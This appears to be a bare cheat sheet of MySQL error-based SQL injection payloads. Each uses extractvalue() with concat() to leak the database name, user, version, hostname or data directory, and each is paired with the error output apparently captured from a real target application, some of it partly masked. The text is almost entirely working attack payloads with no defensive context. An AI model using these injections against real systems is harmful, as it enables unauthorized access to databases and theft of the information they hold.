* **Using database() Functions**
1'+AND+1=extractvalue(rand(),concat(0x3a,database()))--+ 
	"sqlMessage":"XPATH syntax error: ':progress28app'"
  

# Using user() Functions
1'+and+1=extractvalue(rand(),concat(0x3a,user()))--+ 
	"sqlMessage":"XPATH syntax error: ':progress28app@172.x.x.28'"

# Using current_user() Functions
1'+AND+1=extractvalue(rand(),concat(0x3a,current_user()))--+
	"sqlMessage":"XPATH syntax error: ':progress28@%'"

# Using version() Functions
1'+and+1=extractvalue(rand(),concat(0x3a,version()))--+ 
	"sqlMessage":"XPATH syntax error: ':5.7.26-log'"

# Using @@hostname Functions
1'+AND+1=extractvalue(rand(),concat(0x3a,@@hostname))--+
	"sqlMessage":"XPATH syntax error: ':ip-xx.x.x.xxx'"

# Using @@datadir Functions
1'+AND+1=extractvalue(rand(),concat(0x3a,@@datadir))--+
	"sqlMessage":"XPATH syntax error: ':/p28dbdata/db/'"
